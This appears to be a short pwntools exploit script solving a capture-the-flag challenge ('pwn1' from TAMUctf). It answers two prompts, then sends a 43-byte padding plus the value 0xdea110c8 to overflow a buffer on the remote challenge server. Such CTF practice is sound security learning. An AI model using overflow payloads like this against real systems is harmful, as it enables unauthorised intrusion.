from pwn import *

#p = process('./pwn1')
p=remote("pwn.tamuctf.com",4321)

p.recvuntil('What... is your name?')
print '1'
p.sendline('Sir Lancelot of Camelot')
p.recvuntil('What... is your quest?')
print '2'
p.sendline('To seek the Holy Grail.')

p.recvuntil('What... is my secret?')

payload='a'*43+p32(0xdea110c8)
p.sendline(payload)
a=p.recvall()
print a
